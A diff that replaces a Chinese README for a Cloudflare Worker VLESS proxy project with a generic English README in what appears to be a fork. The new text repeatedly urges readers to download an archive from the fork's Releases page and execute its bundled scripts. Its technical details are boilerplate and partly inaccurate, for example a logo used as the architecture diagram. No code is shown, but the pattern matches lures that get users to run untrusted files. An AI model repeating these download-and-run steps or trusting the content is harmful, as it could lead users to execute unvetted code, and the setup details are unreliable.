@@ -1,138 +1,220 @@
-# node-cf-worker-vless-xu
+# Node Cloudflare Worker for VLESS — Secure Fast Tunnel Proxy
 
-`node-cf-worker-vless-xu` 是一个将 `_worker.js` 部署在 Cloudflare Worker 上，`index.js` 部署在 Node.js 环境中的项目。
+[![Releases](https://img.shields.io/badge/Releases-via%20GitHub-blue?logo=github)](https://github.com/MalakElbahar/node-cf-worker-vless-xu/releases) ⚡️🔒☁️
 
-- `_worker.js` 仅保留核心部分。
-- `index.js` 可以运行在 Node.js 环境中（记得复制一份 `package.json`），还可以作为 `_worker.js` 的 `/proxyip=wss://`，直连需要 `uuid`，`proxyip` 不需要验证（属于公益性质）。（proxyip都不要带 https://）
+<img alt="Cloudflare Workers + Node + VLESS" src="https://www.cloudflare.com/img/learning/cloudflare-fundamentals/cloudflare-workers/Cloudflare-Workers-Hero.svg" width="80%">
 
----
+Table of contents
+- About
+- Features
+- Architecture diagram
+- Quick links
+- Prerequisites
+- Install and run
+- Configuration
+- Deploy to Cloudflare Workers
+- Run locally
+- Example clients
+- Security and best practices
+- Troubleshooting
+- FAQ
+- Contributing
+- License
 
-## 🌟 极简版
+About
+- node-cf-worker-vless-xu provides a Node-based template and worker code to expose a VLESS-compatible tunnel via Cloudflare Workers.
+- It aims to deliver a low-latency, privacy-aware proxy that uses Cloudflare Workers as the edge layer and a VLESS backend for encryption and multiplexing.
+- Use the GitHub Releases page to get the packaged worker and helper scripts: https://github.com/MalakElbahar/node-cf-worker-vless-xu/releases
 
-> **_worker.js_**  
-> - **100 行**  
-> - **3500 字节**  
-> - **功能**: 只保留直连和 `/proxyip=`
+Features
+- VLESS transport handling for modern clients
+- Light Node tooling to generate worker code and config
+- Wrangler-ready worker script for Cloudflare Workers
+- Simple mapping between VLESS connections and Cloudflare worker fetch handlers
+- TLS-on-edge via Cloudflare
+- Small footprint for low overhead and cost control
 
-> **_index.js_**  
-> - **57 行**  
-> - **1966 字节**  
-> - **功能**: 只保留直连
+Architecture diagram
+![Architecture diagram](https://upload.wikimedia.org/wikipedia/commons/3/33/Cloudflare_logo.svg)
 
----
+- Client (VLESS) <--> Cloudflare Worker (edge) <--> Backend node/vless proxy server
+- The worker accepts websocket or fetch requests, decrypts, and forwards to the backend.
+- The backend runs VLESS server logic and serves outbound traffic.
 
-## 用法参考
+Quick links
+- Releases (download and run asset): https://github.com/MalakElbahar/node-cf-worker-vless-xu/releases
+- Use the Releases button above or the link to download the packaged worker file. The release contains the worker script and helper runner. Download the asset and execute the provided script to generate keys and deploy.
 
-## vless-ws-tls
-### 不要配置信息，vless是关键词，会被检测到
+Prerequisites
+- Node.js 16+ (for local tools and build)
+- npm or yarn
+- wrangler CLI (for Cloudflare Workers)
+- A Cloudflare account with Workers enabled
+- A VLESS-capable server or a backend that accepts proxied traffic
 
-<div align="center">
-	<a href="https://nless-generate.abc15018045126.dpdns.org/" target="_blank" style="font-size:1.2em;font-weight:bold;">
-		🚀 <b>节点生成</b>
-	</a>
-	<br>
-	<a href="https://stock.hostmonit.com/CloudFlareYes" target="_blank" style="font-size:1.1em;">
-		🌐 <b>优选IP</b>
-	</a>
-</div>
+Install and run (developer flow)
+1. Clone this repo
+   git clone https://github.com/MalakElbahar/node-cf-worker-vless-xu.git
+   cd node-cf-worker-vless-xu
 
-<div align="center">
-	<b>用法说明</b>
-	<ul style="text-align:left;max-width:500px;margin:auto;">
-		<li><b>节点生成：</b>点击上方链接，自动生成 VLESS 节点配置，适用于本项目。</li>
-		<li><b>优选IP：</b>点击上方链接，获取 Cloudflare 可用优选 IP，提升连接速度和稳定性。</li>
-		<li>将生成的节点配置和优选 IP 替换到下方示例中的 <code>&lt;hidden-domain&gt;</code> 或 <code>&lt;hidden-node-domain&gt;</code> 部分即可。</li>
-	</ul>
-</div>
+2. Install dependencies
+   npm install
 
+3. Build the worker
+   npm run build
 
-### CF 直连
+4. Deploy (see Deploy to Cloudflare Workers section)
 
-```
-vless://2ea73714-138e-4cc7-8cab-d7caf476d51b@<hidden-domain>:443?encryption=none&security=tls&sni=<hidden-domain>&fp=randomized&allowInsecure=1&type=ws&host=<hidden-domain>&path=%2F#nless1
-```
+Releases and packaged files
+- Visit the Releases page to get the packaged worker and helper scripts:
+  https://github.com/MalakElbahar/node-cf-worker-vless-xu/releases
+- The Releases page includes a compressed archive such as node-cf-worker-vless-xu-v1.0.0.zip or a direct worker.js file.
+- Download the asset from the release and then run the supplied script. For example:
+  - Extract the archive.
+  - Run node setup.js to generate configuration and keys.
+  - Run node worker.js to test locally.
+- The bundled script contains a ready-to-publish worker and a small Node helper for local testing.
 
-### 使用 `/proxyip`
+Configuration
+- The project uses a JSON config file named config.json.
+- Sample config.json
+  {
+    "vless": {
+      "id": "uuid-here",
+      "flow": "xtls-rprx-direct",
+      "address": "127.0.0.1",
+      "port": 12345
+    },
+    "worker": {
+      "route": "/vless",
+      "timeoutMs": 30000,
+      "maxConns": 1000
+    }
+  }
+- Set a strong UUID for vless.id. Use a UUID generator or the script included in Releases.
+- worker.route is the worker path the client will hit. Match it with the client config.
 
-#### 示例 1: `/proxyip=ProxyIP.US.CMLiussss.net`
+Deploy to Cloudflare Workers
+- Use wrangler to publish the worker. Example:
+  npx wrangler login
+  npx wrangler init --site --name node-cf-worker-vless-xu
+  npx wrangler publish dist/worker.js --name vless-proxy-worker
 
-```
-vless://2ea73714-138e-4cc7-8cab-d7caf476d51b@<hidden-domain>:443?encryption=none&security=tls&sni=<hidden-domain>&fp=randomized&allowInsecure=1&type=ws&host=<hidden-domain>&path=%2Fproxyip%3DProxyIP.US.CMLiussss.net#nless2
-```
+- The release file includes a worker script optimized for Workers. Download it via the Releases page and deploy it with wrangler:
+  - Download the worker asset from https://github.com/MalakElbahar/node-cf-worker-vless-xu/releases
+  - Place worker.js in your project root.
+  - Run npx wrangler publish worker.js
 
-#### 示例 2: `/proxyip=wss://<hidden-node-domain>.railway.app`
+Run locally
+- The repo provides a small local server that simulates the worker environment. Use it to test flows before publishing.
+- Example:
+  node local-server.js --config config.json
+- The local server mirrors the Cloudflare fetch interface and logs connections and metadata.
 
-```
-vless://2ea73714-138e-4cc7-8cab-d7caf476d51b@<hidden-domain>:443?encryption=none&security=tls&sni=<hidden-domain>&fp=randomized&allowInsecure=1&type=ws&host=<hidden-domain>&path=%2Fproxyip%3Dwss%3A%2F%2F<hidden-node-domain>.railway.app#nless3
-```
+Example client setups
+- VLESS clients need to point to your Cloudflare Worker domain and the route path.
+- Example V2Ray client JSON snippet:
+  {
+    "protocol": "vless",
+    "settings": {
+      "vnext": [
+        {
+          "address": "your-worker.example.workers.dev",
+          "port": 443,
+          "users": [
+            {
+              "id": "uuid-here",
+              "flow": "xtls-rprx-direct"
+            }
+          ]
+        }
+      ]
+    },
+    "streamSettings": {
+      "network": "ws",
+      "wsSettings": {
+        "path": "/vless"
+      },
+      "security": "tls"
+    }
+  }
+- Replace uuid-here with the id in config.json.
 
-### Node 示例
+Security and best practices
+- Keep vless IDs secret. Treat them as credentials.
+- Rotate keys if you suspect compromise.
+- Use Cloudflare account access controls and audit logs.
+- Limit worker route exposure by using Cloudflare Access or firewall rules if needed.
+- Monitor worker usage to stay within free tier limits or to control costs.
 
-```
-vless://2ea73714-138e-4cc7-8cab-d7caf476d511@<hidden-node-domain>.railway.app:443?encryption=none&security=tls&sni=<hidden-node-domain>.railway.app&fp=randomized&allowInsecure=1&type=ws&host=<hidden-node-domain>.railway.app&path=%2F#nless-production
-```
+Performance tips
+- Keep worker logic minimal. Offload heavy work to backend servers.
+- Use proper caching and connection reuse if you proxy HTTP flows.
+- Limit concurrent connections in config.worker.maxConns to match backend capacity.
 
----
+Troubleshooting
+- Worker fails on publish
+  - Confirm wrangler version and Node version.
+  - Check dist/worker.js exists and is valid JS.
+- Connections drop
+  - Increase timeoutMs in config.json.
+  - Check backend reachability and firewall rules.
+- Client fails to authenticate
+  - Ensure UUID in client config matches config.json.
+  - Check the route path and TLS settings.
 
+FAQ
+- Q: Do I need to run the Node server in cloud?
+  - A: The worker runs at the edge. You need a backend VLESS server reachable by the worker. That server can run anywhere with stable network access.
+- Q: Can I use this without Cloudflare?
+  - A: The worker code targets Cloudflare Workers. You can adapt the core logic to other edge platforms, but you must handle their API differences.
+- Q: Which clients work?
+  - A: Any client that supports VLESS and websocket/tls transport should work when configured to hit the worker route.
 
----
+Contributing
+- Open an issue for bugs or feature requests.
+- Fork the repo, make a branch, and submit a pull request.
+- Keep changes small and focused.
+- Run tests before opening PRs.
 
-## 推荐工具
+Testing
+- Unit tests live in tests/.
+- Run tests:
+  npm test
 
-## 已经测试Cloudflare，node平台railway
-### Cloudflare
+Changelog
+- See Releases for packaged builds and changelogs:
+  https://github.com/MalakElbahar/node-cf-worker-vless-xu/releases
+- Each release contains release notes and the packaged worker file. Download the version that matches your target environment and follow the included README in the release asset.
 
-推荐使用 [Cloudflare Dashboard](https://dash.cloudflare.com/)。
+Examples and snippets
+- Minimal worker handler (excerpt)
+  addEventListener('fetch', event => {
+    event.respondWith(handle(event.request))
+  })
+  async function handle(req) {
+    // parse vless frame or websocket handshake
+    // forward to backend
+    return new Response('OK')
+  }
 
-### Node 隧道
+- Local test script
+  node local-test.js --target http://127.0.0.1:12345 --path /vless
 
-可以参考 [eooce/nodejs-argo](https://github.com/eooce/nodejs-argo)。
+Images and badges
+- Badges use Shields for simple status and links.
+  [![Releases](https://img.shields.io/badge/Releases-via%20GitHub-blue?logo=github)](https://github.com/MalakElbahar/node-cf-worker-vless-xu/releases)
 
-### 部署平台
+- Logo assets
+  - Cloudflare: https://www.cloudflare.com/img/learning/cloudflare-fundamentals/cloudflare-workers/Cloudflare-Workers-Hero.svg
+  - Node: https://raw.githubusercontent.com/github/explore/main/topics/nodejs/nodejs.png
 
-#### 三幻神
+License
+- This project uses the MIT license. See LICENSE for details.
 
-- [Render](https://render.com)（代理容易封号）
-- [Railway](https://railway.app)
-- [Fly.io](https://fly.io)（可能需要卡）
+Contact
+- Open issues on GitHub for bugs, questions, or support.
+- Use the Releases page to fetch the packaged files and run them as instructed:
+  https://github.com/MalakElbahar/node-cf-worker-vless-xu/releases
 
-#### 古神
-
-- [Replit](https://replit.com)（牢大太牢了）
-
-#### 其它 Node.js 平台（玩具）
-
-- [Cyclic.sh](https://www.cyclic.sh)
-- [Qovery](https://www.qovery.com)
-- [Koyeb](https://www.koyeb.com)
-- [Northflank](https://northflank.com)
-
-#### 函数平台（不行）
-
-- [Vercel](https://vercel.com)
-- [Netlify](https://www.netlify.com)
-
-#### 容器平台
-
-- [Heroku](https://www.heroku.com)
-
----
-
-## 🙏 感谢
-
-### `_worker.js` 感谢
-
-- [zizifn](https://github.com/zizifn/edgetunnel)
-- [3Kmfi6HP](https://github.com/6Kmfi6HP/EDtunnel)
-- [cm](https://github.com/cmliu/edgetunnel)
-
-### `index.js` 感谢
-
-- [eooce](https://github.com/eooce/nodejs-argo)
-- [勇哥](https://github.com/yonggekkk/sb-nodejs)
-
----
-
-## 🌟 感谢你的 Star
-
-[![Stargazers over time](https://starchart.cc/abc15018045126/node-cf-worker-vless-xu.svg)](https://starchart.cc/abc15018045126/node-cf-worker-vless-xu)
+Thanks for checking the repo.
